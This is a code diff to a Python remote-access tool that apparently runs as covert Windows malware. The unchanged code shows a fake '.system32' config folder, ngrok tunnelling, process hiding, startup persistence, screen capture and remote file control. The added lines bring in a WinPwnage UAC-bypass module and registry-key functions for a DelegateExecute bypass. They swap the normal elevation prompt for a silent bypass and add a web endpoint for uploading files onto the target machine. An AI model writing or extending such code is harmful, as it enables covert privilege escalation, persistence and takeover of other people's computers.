@@ -59,7 +59,8 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 from ctypes import cast, POINTER
 import pythoncom
-
+import sys, pathlib; sys.path.insert(0, str(pathlib.Path(f"{os.getcwd()}\\winpwnage").resolve()))
+from uacMethod2 import *
 disable_warnings_urllib3()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -78,7 +79,6 @@ flask_thread = None
 ngrok_process = None
 ngrok_url = None
 server = None
-
 CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".system32")
 os.makedirs(CONFIG_DIR, exist_ok=True)
 CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
@@ -218,7 +218,6 @@ def setup_ngrok_auth(ngrok_path):
     if auth_token:
         subprocess.run([ngrok_path, "config", "add-authtoken", auth_token], 
                       capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-
 def start_ngrok(ngrok_path):
     global ngrok_process, ngrok_url
     
@@ -396,7 +395,26 @@ def hide_process():
     except Exception as e:
         logger.error(f"Error hiding process: {e}")
         return False
-
+def create_reg_key(key, value):
+    '''
+    Creates a reg key
+    '''
+    try:        
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
+        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
+        winreg.CloseKey(registry_key)
+    except WindowsError:        
+        raise
+def bypass_uac(cmd):
+    '''
+    Tries to bypass the UAC
+    '''
+    try:
+        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
+        create_reg_key(None, cmd)    
+    except WindowsError:
+        raise
 def add_to_startup():
     try:
         startup_paths = [
@@ -680,11 +698,7 @@ def __del__(self):
     self.cleanup()
 
 extractor = None
-def execute():
-    if not is_admin():
-        print("Program isn't running with admin privileges.")
-    else:
-        print("Program is running with admin privileges.")
+
 
 def play_video_fullscreen_blocking(video_path):
     import cv2
@@ -1381,6 +1395,10 @@ HTML_INTERFACE = """
                         <input type="text" id="file-to-delete" placeholder="File to delete...">
                         <button class="btn btn-danger" onclick="deleteFile()">🗑️ Delete File</button>
                     </div>
+                    <div class="input-group">
+                        <input type="file" id="file-to-upload" placeholder="File to upload...">
+                        <button class="btn" onclick="uploadFile()">📤 Upload File</button>
+                    </div>
                     <div class="result-area">
                         <pre id="file-result">File listing will appear here...</pre>
                     </div>
@@ -1464,7 +1482,29 @@ HTML_INTERFACE = """
             showNotification('Network error occurred', 'error');
         }
     }
+    async function uploadFile() {
+        const fileInput = document.getElementById('file-to-upload');
+        const file = fileInput.files[0];
+        if (!file) {
+            alert("Please select a file to upload.");
+            return;
+        }
 
+        const formData = new FormData();
+        formData.append('file', file);
+
+        try {
+            const response = await fetch('/api/upload_file', {
+                method: 'POST',
+                body: formData
+            });
+
+            const text = await response.text();
+            document.getElementById('file-result').textContent = text;
+        } catch (error) {
+            document.getElementById('file-result').textContent = "Error: " + error;
+        }
+    }
     async function captureScreen() {
         try {
             const response = await fetch('/api/screen');
@@ -1640,7 +1680,14 @@ HTML_INTERFACE = """
     async function listFiles() {
         try {
             const response = await fetch('/api/list_files');
-            const result = await response.json();
+            const text = await response.text();
+            let result;
+            try {
+                result = JSON.parse(text);
+            } catch {
+                document.getElementById('file-result').textContent = "Non-JSON response:\n" + text;
+                return;
+            }
             document.getElementById('file-result').textContent = result.files || result.error;
             document.getElementById('file-path').value = result.current_dir || '';
         } catch (error) {
@@ -1923,7 +1970,7 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
             try:
                 if ctypes.windll.shell32.IsUserAnAdmin():
                     return jsonify({'success': True, 'result': 'Already running as administrator'})
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                uacMethod2(["c:\\windows\\system32\\cmd.exe ", "/k", f"python {__file__}"])
                 return jsonify({'success': True, 'result': 'Admin privileges requested'})
             except Exception as e:
                 return jsonify({'success': False, 'error': f'Failed to elevate: {e}'})
@@ -2354,6 +2401,20 @@ def api_download_file():
             return send_file(target, as_attachment=True)
         else:
             return "File not found", 404
+    except Exception as e:
+        return str(e), 500
+@app.route('/api/upload_file', methods=['POST'])
+def api_upload_file():
+    global current_dir
+    try:
+        if 'file' not in request.files:
+            return "No file part", 400
+        file = request.files['file']
+        if file.filename == '':
+            return "No selected file", 400
+        save_path = os.path.join(current_dir, file.filename)
+        file.save(save_path)
+        return f"File '{file.filename}' uploaded successfully to {current_dir}", 200
     except Exception as e:
         return str(e), 500
 
